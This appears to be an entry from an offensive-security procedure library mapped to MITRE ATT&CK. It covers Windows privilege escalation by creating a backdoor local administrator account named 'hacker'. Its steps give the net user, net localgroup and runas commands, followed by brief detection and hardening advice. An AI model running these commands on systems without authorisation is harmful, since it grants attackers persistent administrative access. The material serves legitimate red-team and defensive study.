---
tags:
  - privilege-escalation
  - account-creation
type: procedure
tools: []
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/add-local-user]]'
  - '[[commands/add-user-to-administrators]]'
platforms:
  - Windows
techniques:
  - '[[Exploitation for Privilege Escalation]]'
  - '[[Create Account]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 8502f959-ecef-4ad2-8dd5-34044b20db07
created_at: '2025-12-14T17:26:17.557Z'
updated_at: '2025-12-14T17:26:17.557Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploitation for Privilege Escalation]]'
  - '[[Create Account]]'
---
# Perform Privilege Escalation via Payload Execution

## Summary

This procedure verifies and leverages the privilege escalation achieved by the hijacked service payload, which creates a new local administrator account for persistent access.

## Description

Once the malicious executable runs as SYSTEM, it executes Windows net commands to add a new user and grant it admin rights. This provides the attacker with a backdoor account for future logins, bypassing original low-priv limitations. Verification involves checking user lists post-execution.

## Requirements

1. Successful hijack and execution from prior steps
2. Knowledge of payload credentials (e.g., username: hacker, password: P@ssword!)
3. Command prompt access to verify

## Defense

Defensive measures and detection strategies:

- Audit new account creations (Event ID 4720) and group additions (Event ID 4732)
- Implement just-in-time admin privileges with tools like LAPS
- Block net.exe usage via AppLocker or WDAC

## Objectives

1. Confirm new admin account creation
2. Gain persistent elevated access
3. Validate full SYSTEM-to-admin escalation chain

## Instructions

### Step 1: Verify User Creation

**Context**: Check if the payload's [[commands/add-local-user]] executed successfully.

**Command** ([[commands/add-local-user]]):
```cmd
net user hacker P@ssword! /add
```

> Adds the user if not already done by payload. Expected output: The command completed successfully.

### Step 2: Add User to Administrators

**Context**: Ensure the new user has admin privileges via [[commands/add-user-to-administrators]].

**Command** ([[commands/add-user-to-administrators]]):
```cmd
net localgroup administrators hacker /add
```

> Grants admin rights. Expected output: The command completed successfully.

### Step 3: Test Access

**Context**: Log in or run privileged commands to confirm escalation.

**Command** (Test):
```cmd
runas /user:hacker cmd.exe
whoami /groups
```

> Expected output: Successful login; Administrators group membership shown.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Exploitation for Privilege Escalation]] Exploitation for Privilege Escalation
- [[Create Account]] Create Account

### Sub-Techniques


## Commands Used

- [[commands/add-local-user]]
- [[commands/add-user-to-administrators]]

## Tools Used


## Tags

- account-creation
- admin-elevation
- persistence
